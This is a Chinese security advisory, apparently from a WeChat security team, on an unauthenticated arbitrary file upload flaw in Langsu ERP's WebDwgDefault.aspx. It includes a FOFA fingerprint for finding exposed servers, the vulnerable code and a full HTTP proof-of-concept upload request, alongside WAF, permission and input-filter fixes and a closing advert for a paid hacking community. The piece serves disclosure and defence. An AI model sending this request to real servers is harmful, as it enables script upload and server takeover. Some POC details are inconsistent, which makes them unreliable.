#  成都朗速ERP系统高危漏洞曝光！任意文件上传（附修复方案）   
原创 WL  Rot5pider安全团队   2025-05-29 01:57  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6nNyjd9QeAUdlJnqcbr4YsiaJBYGWoeEEFUicUo1STkXfMNjmDrdbO9Jf04Q6luKiaYAyjTWMQuofCg/640?wx_fmt=gif "")  
  
  
点击上方蓝字  关注安全知识     
  
  
### 紧急预警：成都朗速ERP系统高危漏洞曝光！任意文件上传（附修复方案）  
#### 一、漏洞背景  
  
近日，国内企业信息化领域常用的**成都朗速科技有限公司ERP系统（朗速ERP）**  
被曝存在**高危任意文件上传漏洞**  
。攻击者可利用该漏洞直接上传恶意脚本文件（如ASP木马），实现**远程控制服务器、窃取核心数据、渗透内网**  
等攻击。经验证，漏洞利用门槛极低，风险等级为**严重（Critical）**  
。  
#### 二、漏洞详情  
  
**漏洞名称**  
：朗速ERP WebDwgDefault.aspx 任意文件上传漏洞  
**风险等级**  
：高危  
**影响版本**  
：Web_v8及以下版本（其他版本需进一步验证）  
**FOFA指纹**  
：body="/Resource/Scripts/Yw/Yw_Bootstrap.js"  
**漏洞位置**  
：Lserp_Web_v8\Lserp_v8\WebDwgDefault.aspx  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1JSNicEVqJosEDBy3VElWTNeriaA8J00zJLibgQTMeNvNbLbkTnYwrvCJoZgUibwoAIUJmLnf54XASTJg/640?wx_fmt=png&from=appmsg "")  
#### 三、漏洞原理深度剖析  
  
**核心代码缺陷**  
（代码原文未改动）：  
```
// 漏洞代码片段（原始内容未修改）string fileTmpPath= Server.MapPath("./");protected void Page_Load(object sender, EventArgs e) {    fileTmpPath= Server.MapPath("./");    // ...}string sGetFile= fileTmpPath+url;HttpPostedFile file= Request.Files[0];file.SaveAs(sGetFile);  // 关键危险操作
```  
  
漏洞位置：Lserp_Web_v8\Lserp_v8\WebDwgDefault.aspx**漏洞触发逻辑**  
：  
1. **路径拼接失控**  
fileTmpPath  
直接映射网站根目录，且FileName  
参数未过滤../  
等路径穿越符号，攻击者可上传文件至任意路径（如../../webroot/shell.asp  
）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1JSNicEVqJosEDBy3VElWTNeNgibR3Sj0aFiaD35tnnmfNeZlicxbKqa4XoicJMiaH063Q9GaQHYdbwo1TA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1JSNicEVqJosEDBy3VElWTNezWx0pxlnVuPe8nxnZhcFqEfSPb0Y4wr6HUHGtFnXMfxLEgPp447JKw/640?wx_fmt=png&from=appmsg "")  
1. **文件类型无校验**  
  
代码中尝试检查.dll  
扩展名（但存在拼写错误Filelnfo  
），实际未生效，导致允许上传任意文件类型。  
  
1. **权限绕过**  
IsSave=true  
参数未验证用户身份，攻击者无需登录即可触发上传逻辑。  
  
#### 四、漏洞复现（POC原文未改动）  
  
**攻击步骤**  
：  
1. **构造恶意请求上传木马文件**  
（原始POC未修改）：  
```
POST /WebDwgDefault.aspx?IsSave=true&FileName=test.asp HTTP/1.1Host: ip:portX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36Accept: application/json, text/javascript, */*; q=0.01Content-Type: multipart/form-data; boundary=----123Content-Length: 331------123Content-Disposition: form-data; name="file"; filename="1.aspx"<% Response.Write("hello world")%>------123--
```  
  
  
1. **访问上传文件验证漏洞**  
：  
  
访问 http://目标网站/test.asp  
，若页面返回hello world  
，则漏洞利用成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1JSNicEVqJosEDBy3VElWTNerWIQic0Y91gm9ia9sYySnK9mPDicn4BgE1xfRVqCPJsiatA7mk7FsvwgRw/640?wx_fmt=png&from=appmsg "")  
#### 五、影响范围  
  
所有使用朗速ERP系统且未修复漏洞的企业，包括：  
- 制造业、供应链等依赖ERP系统的企业  
  
- 公网暴露的朗速ERP服务器（FOFA已发现数百台受影响资产）  
  
#### 六、紧急修复方案  
  
**临时处置措施**  
：  
1. **拦截恶意请求**  
  
在WAF/防火墙中添加规则，阻断包含IsSave=true  
参数的请求：  
```
if ($args ~* "IsSave=true") { return 403; }
```  
  
  
1. **限制服务器目录权限**  
  
禁止网站目录执行脚本（以IIS为例）：  
```
icacls "C:\inetpub\wwwroot\uploads" /deny IIS_IUSRS:(M)
```  
  
  
**官方修复建议**  
：  
- 立即联系厂商获取补丁，升级至安全版本  
  
- 监控系统日志，排查是否存在已上传的恶意文件  
  
#### 七、深度防御建议  
1. **输入过滤**  
  
对FileName  
参数强制限制为合法字符（正则示例）：  
```
^[a-zA-Z0-9_\-]+\.(dwg|dwf|dxf)$
```  
  
  
1. **文件存储隔离**  
  
将上传目录独立至非Web路径，并禁用脚本执行权限。  
  
1. **身份鉴权加固**  
  
在文件上传逻辑中增加会话验证及管理员权限检查。  
  
#### 八、结语  
  
此次漏洞因代码逻辑缺陷引发，再次警示企业需严格管控文件上传功能。建议所有朗速ERP用户立即自查，并遵循最小权限原则加固系统。网络安全防线需时刻紧绷，莫让漏洞成为攻击者的入口！  
  
**【法律声明】本漏洞信息仅限用于企业安全建设，严禁非法渗透测试！**  
  
  
  
【限时  
6  
折！华普安全研究星球：以  
原创实战  
为主+SRC/内网渗透核心资源库，助你在漏洞挖掘、SRC挖掘少走90%弯路】当90%的网络安全学习者还在重复刷题、泡论坛找零散资料时，华普安全研究星球已构建起完整的「攻防实战知识生态」：  
  
✅ 原创深度技术文档（独家SRC漏洞报告/代码审计报告）  
  
✅ 实战中使用到的工具分享  
  
✅ 全年更新SRC挖掘、代码审计报告（含最新0day验证思路）  
  
✅ 漏洞挖掘思维导图  
  
✅内部知识库目前建设中、后续进入圈子免费进入  
  
【  
实战为王  
】不同于传统课程的纸上谈兵！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT1s5WIQzLQXibdxCf6fkianYH5bSeKhcPcQPNR8E1iaJz2aAqonzogTKicg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTxJibeicaQ0uttmutBuckibQFCEVicpyhhWXprQVOn4AnAnpDauQiaWTblMQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT9hvFFPpSupL0Q8d0Yv1F7dYxGZJjcKxHYTyiayhMI3xcVRoQhSs9VTQ/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTh0eO1DbG0onZph7o1AMPVU65ZjE5T9QH8XeMU0WNE5HiaUibNTBcQyyg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTpXhxBicMHYsw8hotg4abR2gdaqYkfGPhX8EeNPcibAAs89qcOWl8Sqdw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRTJvsQnibaNk5WSuwpkDvkZTIFqN3XyKic4Mg5qI91sjNGQtibJRbEfIxgw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/OMTnCvx3T1KibZGSTtYYMVNzA35ZxXVRT7UqeH8ibia1N77Q9iaLtwD9NU7Nt9gicr8sdmDGfQQvibnTDKQYNIJP6tFw/640?wx_fmt=jpeg&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
**后期我们将持续发布原创代码审计、src等漏洞挖掘文章，后期有些源码、挖掘思路等也会放进圈子哈~**  
  
**有任何问题可后台留言**  
  
  
  
  
往期精选  
  
  
  
围观  
  
[PHP代码审计学习](http://mp.weixin.qq.com/s?__biz=Mzg5OTYxMjk0Mw==&mid=2247484594&idx=1&sn=89c96ed25e1f1d146fa3e67026ae0ca1&chksm=c051ecd2f72665c45d3e8c51b94629319b992f7f459d5677d7ce253eac99fc5e2e8f78684907&scene=21#wechat_redirect)  
  
  
丨更多  
  
热文  
  
[浅谈应急响应](http://mp.weixin.qq.com/s?__biz=Mzg5OTYxMjk0Mw==&mid=2247484589&idx=1&sn=80ff6dbb4471c101a71e203a10354d59&chksm=c051eccdf72665db0530fce6a332bf44392fb0c4d3d61496c9141bb93ece816cbbe97f89d06f&scene=21#wechat_redirect)  
  
  
丨更多  
  
·end·  
  
—如果喜欢，快分享给你的朋友们吧—  
  
我们一起愉快的玩耍吧  
  
  
  
【免责声明】  
  
"Rot5pider安全团队"作为专注于信息安全技术研究的自媒体平台，致力于传播网络安全领域的前沿知识与防御技术。本平台所载文章、工具及案例均用于合法合规的技术研讨与安全防护演练，严禁任何形式的非法入侵、数据窃取等危害网络安全的行为。所有技术文档仅代表作者研究过程中的技术观察，不构成实际操作建议，更不作为任何法律行为的背书。  
  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/OMTnCvx3T1K26bQox3P7WP9dbZ8fiaWVicDTm83Sic86kzBCzlXI5OiazEoc5ZrPHHWsRb80WlZcKRll5xOU2s5JKw/640?wx_fmt=gif&from=appmsg "")  
  
  
  
